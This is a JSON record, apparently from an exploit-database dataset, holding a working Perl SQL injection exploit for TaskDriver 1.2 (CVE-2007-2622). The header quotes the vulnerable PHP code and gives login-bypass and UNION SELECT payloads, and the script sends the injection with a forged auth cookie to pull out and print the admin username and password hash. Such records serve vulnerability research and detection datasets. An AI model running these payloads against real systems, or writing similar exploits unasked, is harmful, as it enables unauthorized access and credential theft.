{
  "id": "3896",
  "title": "TaskDriver 1.2 - Authentication Bypass / SQL Injection",
  "cve": "CVE-2007-2622",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t      TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Login Bypass & Admin Username & Hash Retrieval\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (login.php): \t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# $sql = \"SELECT * FROM  $userstable WHERE username = '$_POST[username]' AND    #\r\n#         password = md5('$_POST[password]')\";\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (notes.php):\t\t\t\t\t\t\t#\r\n#       \t\t\t\t\t\t\t\t\t#\r\n# $taskid = $_GET['taskid'];\t\t\t\t\t\t\t#\r\n# $sql = \"SELECT * FROM $taskstable WHERE taskid = '$taskid'\";\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: http://victim.com/login.php\t\t\t\t\t\t#\r\n#      In username box input: ' OR 1=1 /*\t\t\t\t\t#\r\n#      In password box: [ANYTHING OR NOTHING]\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#      OR: \t\t\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#      http://victim.com/notes.php?taskid=-999' UNION SELECT 0,0,username,      #\r\n#      0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: magic_quotes_gpc set to off\t\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n# Notes: You can do a UNION INSERT in the password reset form to add an admin\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 1){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"           TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_taskdriver.pl [PATH]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where TaskDriver is located\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_taskdriver.pl http://victim.com/taskdriver/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n$cookie = \"fook%21%27+or+1%3D1+%2F%2A;\";\r\n$host = $ARGV[0] . \"notes.php?taskid=-999' UNION SELECT 0,0,username,0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*\";\r\n\r\nmy @cookie = ('Cookie' => \"auth=$cookie;\");\r\nmy $res = $b->get($host, @cookie);\r\n\r\n$answer = $res->content;\r\nif ($answer =~ /notes on (.*?)<\\/u><\\/td><\\/tr>/){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $1\\n\";\r\n}\r\n\r\nif ($answer =~/([0-9a-fA-F]{32})<\\/font>/){\r\nprint \"[+] Admin Hash : $1\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-05-10]",
  "url": "https://www.exploit-db.com/exploits/3896"
}